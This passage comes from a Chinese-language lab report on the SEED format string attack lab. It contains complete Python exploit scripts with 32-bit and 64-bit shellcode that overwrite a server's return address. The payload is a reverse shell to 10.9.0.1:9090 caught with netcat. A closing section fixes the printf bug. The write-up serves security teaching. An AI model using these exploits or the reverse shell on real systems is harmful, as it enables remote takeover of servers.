class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_32<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span> - <span class="hljs-built_in">len</span>(shellcode)               <span class="hljs-comment"># 将shellcode放置于buf的尾部</span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><span class="hljs-comment">############################################################</span><br>buf_addr = <span class="hljs-number">0xffffd1df</span><span class="hljs-comment">#根据服务器输出The input buffer&#x27;s address得到输入的起始地址</span><br>ebp_addr = <span class="hljs-number">0xffffd118</span><span class="hljs-comment">#根据服务器输出Frame Pointer (inside myprintf)得到myprintf函数ebp的地址</span><br><br>shell_code_addr = buf_addr + <span class="hljs-number">1500</span> - <span class="hljs-built_in">len</span>(shellcode) <span class="hljs-comment">#shellcode的入口地址</span><br>ret_addr = ebp_addr + <span class="hljs-number">0x4</span> <span class="hljs-comment">#myprint的返回地址所在的地址</span><br><br><span class="hljs-comment"># 目标：将ret_addr存储的值修改为shell_code_addr</span><br>high = (shell_code_addr&amp;<span class="hljs-number">0xffff0000</span>)&gt;&gt;<span class="hljs-number">16</span> <span class="hljs-comment">#shell_code_addr最高两个字节的值</span><br>low = shell_code_addr&amp;<span class="hljs-number">0x0000ffff</span> <span class="hljs-comment">#shell_code_addr最低两个字节的值</span><br><br><span class="hljs-comment"># 原则：先改变较小值对应的返回地址两字节的值</span><br>addr1 = ret_addr <span class="hljs-comment">#addr1：较小值对应的地址</span><br>small = low  <span class="hljs-comment">#small：较小值</span><br>addr2 = ret_addr + <span class="hljs-number">0x2</span> <span class="hljs-comment"># addr2：较大值对应的地址</span><br>large = high <span class="hljs-comment">#large：较大值</span><br><span class="hljs-keyword">if</span> high &lt; low :<br>addr1 = ret_addr+<span class="hljs-number">0x2</span><br>small = high<br>addr2 = ret_addr<br>large = low<br><br><span class="hljs-comment"># 格式化字符串开头：较小值对应地址的字节形式+“@@@@”+较大值对应地址的字节形式，共12个字符</span><br>content[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]  =  (addr1).to_bytes(<span class="hljs-number">4</span>,byteorder = <span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]  =  (<span class="hljs-string">&quot;@@@@&quot;</span>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>]  =  (addr2).to_bytes(<span class="hljs-number">4</span>,byteorder = <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment"># 需要63个%x使va_list移动至指向buf_addr，存储数值：较小值对应的地址</span><br><span class="hljs-comment"># 前62个%x的精度修饰符设置为4，第63个%x的精度修饰符大小为num1</span><br>num1 = small - <span class="hljs-number">12</span> - <span class="hljs-number">62</span>*<span class="hljs-number">8</span><br><span class="hljs-comment"># %.num2x使第二个%hn对应数值——已打印的字符数改变</span><br>num2 = large - small<br><br><span class="hljs-comment">#得到格式化字符串如下：</span><br>s = <span class="hljs-string">&quot;%.8x&quot;</span>*<span class="hljs-number">62</span> + <span class="hljs-string">&quot;%.&quot;</span> + <span class="hljs-built_in">str</span>(num1) + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span> + <span class="hljs-string">&quot;%.&quot;</span> + <span class="hljs-built_in">str</span>(num2) + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%hn&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">12</span>:<span class="hljs-number">12</span> + <span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-comment">############################################################</span><br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure></li></ol><ol><li><p>由于当新建一个容器时，它的ebp和buf地址会发生变化。我们先通过以下命令：      </p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">shell $ echo hello | nc 10.9.0.5 9090        <br>Press Ctrl+C<br></code></pre></div></td></tr></table></figure><p>得到<code>The input buffer&#39;s address</code>和<code>Frame Pointer (inside myprintf)</code>，按照这两个值修改<code>exploit.py</code>程序中的<code>buf_addr</code>和<code>ebp_addr</code>。<br><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202105511104.png" alt="image-20211202105511104">    </p></li><li><p>执行程序<code>exploit.py</code>，得到<code>badfile</code>。<br><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202102003621.png" alt="image-20211202102003621">     </p></li><li><p>向服务器server-10.9.0.5提供输入，输入为<code>badfile</code>的内容。得到服务器打印出的内容。可以看到，服务器执行了shellcode中预置的命令。<br><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202102052424.png" alt="image-20211202102052424"> </p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202105907665.png" alt="image-20211202105907665">           </p></li></ol><h4 id="获得反向shell-1"><a href="#获得反向shell-1" class="headerlink" title="获得反向shell"></a>获得反向shell</h4><ol><li><p>使用<code>ifconfig -a</code> 查看攻击者服务器的ip地址。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202110353971.png" alt="image-20211202110353971"></p></li><li><p>将<code>exploit.py</code>中的<code>shellcode_32</code>更改（第9行）如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span> <span class="hljs-comment">#修改处</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br></code></pre></div></td></tr></table></figure></li></ol><ol><li><p>在攻击端使用<code>nc -nv -l 9090</code>对端口9090进行监听。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202110559075.png" alt="image-20211202110559075"></p></li><li><p>运行<code>exploit.py</code>，得到<code>badfile</code>。向服务器server-10.9.0.5提供输入，输入为<code>badfile</code>的内容。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202110819562.png" alt="image-20211202110819562"></p></li><li><p>在攻击端可以得到服务器server-10.9.0.5的shell：</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202111143735.png" alt="image-20211202111143735"></p></li></ol><h2 id="7-任务5：攻击64位服务器程序"><a href="#7-任务5：攻击64位服务器程序" class="headerlink" title="7 任务5：攻击64位服务器程序"></a>7 任务5：攻击64位服务器程序</h2><p>​        在前面的任务中，我们的目标服务器是32位程序。在本任务中，我们切换到64位服务器程序。我们的新目标是10.9.0.6，它运行64位版本的格式化程序。让我们首先向该服务器发送一条hello消息。我们将看到目标容器打印出以下消息。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> hello | nc 10.9.0.6 9090</span><br>Press Ctrl+C<br>// Printouts on the container’s console<br>server-10.9.0.6 | Got a connection from 10.9.0.1<br>server-10.9.0.6 | Starting format<br>server-10.9.0.6 | Input buffer (address): 0x00007fffffffe200<br>server-10.9.0.6 | The secret message’s address: 0x0000555555556008<br>server-10.9.0.6 | The target variable’s address: 0x0000555555558010<br>server-10.9.0.6 | Input size: 6<br>server-10.9.0.6 | Frame Pointer (inside myprintf): 0x00007fffffffe140<br>server-10.9.0.6 | The target variable’s value (before): 0x1122334455667788<br>server-10.9.0.6 | hello<br>server-10.9.0.6 | (ˆ_ˆ)(ˆ_ˆ) Returned from printf() (ˆ_ˆ)(ˆ_ˆ)<br>server-10.9.0.6 | The target variable’s value (after): 0x1122334455667788<br></code></pre></div></td></tr></table></figure><ul><li>可以看到帧指针和缓冲区地址的值变为8字节长（而不是32位程序中的4字节）。需要做的是构造有效负载以利用服务器的格式字符串漏洞。最终目标是在目标服务器上获得一个<code>root shell</code>。您需要使用64位版本的<code>shellcode</code>。</li></ul><h3 id="64-位地址带来的挑战"><a href="#64-位地址带来的挑战" class="headerlink" title="64 位地址带来的挑战"></a>64 位地址带来的挑战</h3><p>​        x64 架构带来的一个挑战是地址中的零。 尽管 x64 架构支持 64 位地址空间，但只允许从 0x00 到 0x00007FFFFFFFFFFFF 的地址。 这意味着对于每个地址（8 个字节），最高的两个字节始终为00，对应Ascii码<code>\0</code>。 这会导致问题。</p><p>​        在攻击中，我们需要将地址放在格式字符串中。 对于 32 位程序，我们可以将地址放在任何地方，因为地址内没有00。 对于 64 位程序，我们不能再这样做了。 如果将地址放在格式字符串的中间，当 <code>printf()</code> 解析格式字符串时，它会在遇到<code>\0</code>时停止解析。 基本上，格式字符串中第一个<code>零</code>（<code>\0</code>）之后的任何内容都不会被视为格式字符串的一部分。<br>​        <code>\0</code>引起的问题与缓冲区溢出攻击不同，在缓冲区溢出攻击中，如果使用 <code>strpcy()</code> ，<code>\0</code>将终止内存复制。 在这里，我们在程序中没有内存副本，因此我们可以在输入中使用零，但是将它们放在哪里很关键。</p><h3 id="一个有用的技巧：自由移动参数指针"><a href="#一个有用的技巧：自由移动参数指针" class="headerlink" title="一个有用的技巧：自由移动参数指针"></a>一个有用的技巧：自由移动参数指针</h3><p>​        在格式字符串中，我们可以使用%x将参数指针 <code>va_list</code> 移动到下一个可选参数。 我们也可以直接将指针移动到第k个可选参数。这是使用格式字符串的参数字段（以 <code>k$</code> 的形式）完成的。 以下代码示例使用<code>%3$.20x</code>打印出第 3 个可选参数（数字 3）的值，然后使用<code>%6$n</code>将值写入第 6 个可选参数（变量 var，它的值将变为 20)。 最后，使用 <code>%2$.10x</code>，它将指针移回第二个可选参数（数字 2），并将其打印出来。 可以看到，使用这个方法，我们可以自由地来回移动指针。 此技术对于简化此任务中格式字符串的构造非常有用。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> var = <span class="hljs-number">1000</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$.20x%6$n%2$.10x\n&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, &amp;var);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value in var: %d\n&quot;</span>,var);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>----- Output ------<br>seed@ubuntu:$ a.out<br><span class="hljs-number">000000000000000000030000000002</span><br>The value in var: <span class="hljs-number">20</span><br></code></pre></div></td></tr></table></figure><h3 id="实验操作-7"><a href="#实验操作-7" class="headerlink" title="实验操作"></a>实验操作</h3><ol><li><p>这里我准备将shellcode放在输入的尾部。目标是将将<code>myprintf</code>函数返回地址修改为shellcode的入口地址。这里使用%hn一次修改两字节的值，其中返回地址最高两字节的值0x0000无需改变。</p><p>因为在64位中shellcode的入口地址是包含0x00的。将地址转换为字节时，00对应的Ascii码为<code>\0</code>。当 <code>printf()</code>解析格式化字符串时，在遇到零（<code>\0</code>）后会停止解析，之后的任何内容都不会被视为格式化字符串的一部分。故<code>myprintf</code>函数返回地址的所在地址的高四字节和低四字节应该放在格式化字符串的后面。</p><p>故先用<code>%.numberx</code>修改已打印字符数，然后使用<code>%k$n</code>将指针移动到<code>printf()</code>的第k个参数，这个参数应为要修改的值的地址。</p></li><li><p>故格式化字符串的构成为：”%.<code>number1</code>x”、”%k1<script type="math/tex">`hn"、"%.`number2`x"、"%k2`</script>hn”、”%.<code>number3</code>x”、”%k3<code>$</code>hn”。</p></li><li><p>根据任务2.A的经验，可以得到输入的起始地址是<code>printf()</code>第34个参数的位置。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211203173126917.png" alt="image-20211203173126917"></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211203200540036.png" alt="image-20211203200540036"></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211203200601940.png" alt="image-20211203200601940"></p></li><li><p>关于k1、k2、k3的取值：</p><p>输入最多为1500个字节，故k1、k2、k3各自最多占3个字节。</p><p>number1、number2、number3的取值不会超过FFFFFFFF，即4294967295，各自最多占11个字节。</p><p>故整个格式化字符串最多为63个字节，占不到8个参数的长度。</p><p>对应地将<code>myprint</code>函数的返回地址的0-8位、8-16位、16-24位所在地址，按照数值shellcode的入口地址的0-8位、8-16位、16-24位数值从小到大的顺序放在第42、43和44个参数的位置（34+8=42），相对与输入起始地址的字节大小分别为64、72、80。</p><p>故k1=64，k2=72，k3=80。</p></li><li><p>类似于32位，我的<code>exploit.py</code>实现了自动化计算，每次使用只需修改两个服务器输出的地址<code>The input buffer&#39;s address</code>和<code>Frame Pointer (inside myprintf)</code>即可。<code>exploit.py</code>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br>   <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_64<br><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)               <span class="hljs-comment"># 将shellcode放置于buf的尾部</span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><span class="hljs-comment">############################################################</span><br>buf_addr = <span class="hljs-number">0x00007fffffffe4f0</span><span class="hljs-comment">#根据服务器输出The input buffer&#x27;s address得到输入的起始地址</span><br>ebp_addr = <span class="hljs-number">0x00007fffffffe430</span><span class="hljs-comment">#根据服务器输出Frame Pointer (inside myprintf)得到myprintf函数ebp的地址</span><br><br>shell_code_addr = buf_addr + <span class="hljs-number">1500</span> - <span class="hljs-built_in">len</span>(shellcode) <span class="hljs-comment">#shellcode的入口地址</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%shell_code_addr)<br>ret_addr = ebp_addr + <span class="hljs-number">0x8</span> <span class="hljs-comment">#myprint返回地址所在的地址</span><br><br><span class="hljs-comment"># 目标：将ret_addr存储的值修改为shell_code_addr </span><br><br>a1 = shell_code_addr &amp; <span class="hljs-number">0x000000000000ffff</span> <span class="hljs-comment">#shell_code_addr的0-16位</span><br>a2 = (shell_code_addr &amp; <span class="hljs-number">0x00000000ffff0000</span>) &gt;&gt; <span class="hljs-number">16</span> <span class="hljs-comment">#shell_code_addr的16-32位</span><br>a3 = (shell_code_addr &amp; <span class="hljs-number">0x0000ffff00000000</span>) &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-comment">#shell_code_addr的32-48位</span><br><br><span class="hljs-comment"># 构造列表按shell_code_addr每16位的大小，从小到大排序</span><br><span class="hljs-built_in">list</span>=[a1,a2,a3]<br><span class="hljs-built_in">list</span>.sort()<br><br><span class="hljs-comment">#构造shell_code_addr每16位对应myprint返回地址每16位所在的地址的字典</span><br>d=&#123;a1:ret_addr,a2:ret_addr+<span class="hljs-number">0x2</span>,a3:ret_addr+<span class="hljs-number">0x4</span>&#125;<br><br>num1 = <span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>]<br>num2 = <span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>] - <span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>]<br>num3 = <span class="hljs-built_in">list</span>[<span class="hljs-number">2</span>] - <span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>]<br><br><span class="hljs-comment">#格式化字符串</span><br>s = <span class="hljs-string">&quot;%.&quot;</span> + <span class="hljs-built_in">str</span>(num1) + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%42$hn&quot;</span> + <span class="hljs-string">&quot;%.&quot;</span> + <span class="hljs-built_in">str</span>(num2) + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%43$hn&quot;</span> + <span class="hljs-string">&quot;%.&quot;</span> + <span class="hljs-built_in">str</span>(num3) + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;%44$hn&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>) <br>content[<span class="hljs-number">0</span>:<span class="hljs-number">0</span> + <span class="hljs-built_in">len</span>(fmt)] = fmt<br><br><span class="hljs-comment">#格式化字符串后面对应放上参数：需要被改变的2字节值的地址</span><br>content[<span class="hljs-number">64</span>:<span class="hljs-number">72</span>] = (d[<span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>]]).to_bytes(<span class="hljs-number">8</span>,byteorder = <span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">72</span>:<span class="hljs-number">80</span>] = (d[<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>]]).to_bytes(<span class="hljs-number">8</span>,byteorder = <span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">80</span>:<span class="hljs-number">88</span>] = (d[<span class="hljs-built_in">list</span>[<span class="hljs-number">2</span>]]).to_bytes(<span class="hljs-number">8</span>,byteorder = <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment">############################################################</span><br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure></li><li><p>在攻击端使用<code>nc -nv -l 9090</code>对端口9090进行监听。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204104442584.png" alt="image-20211204104442584"></p></li><li><p>运行<code>exploit.c</code>，得到<code>badfile</code>。向服务器server-10.9.0.6提供输入，输入为<code>badfile</code>的内容。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204104428944.png" alt="image-20211204104428944"></p></li><li><p>在攻击端可以得到服务器server-10.9.0.6的shell：</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204105936022.png" alt="image-20211204105936022"></p></li></ol><h2 id="8-任务6：解决问题"><a href="#8-任务6：解决问题" class="headerlink" title="8 任务6：解决问题"></a>8 任务6：解决问题</h2><p>还记得 gcc 编译器生成的警告信息吗？ 请解释这是什么意思。 请修复服务器程序中的漏洞，并重新编译。 编译器警告会消失吗？ 你的攻击还有效吗？ 您只需要尝试一种攻击，看看它是否仍然有效。</p><h3 id="警告信息"><a href="#警告信息" class="headerlink" title="警告信息"></a>警告信息</h3><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204110238866.png" alt="image-20211204110238866"></p><p>意思是：字符串格式并不是一个常量，而且没有格式化字符串的参数。</p><h3 id="修复漏洞"><a href="#修复漏洞" class="headerlink" title="修复漏洞"></a>修复漏洞</h3><p>将<code>format.c</code>中<code>printf(msg)</code>更改为<code>printf(&quot;%s&quot;,msg)</code>，并重新编译，发现没有警告。</p><p><img 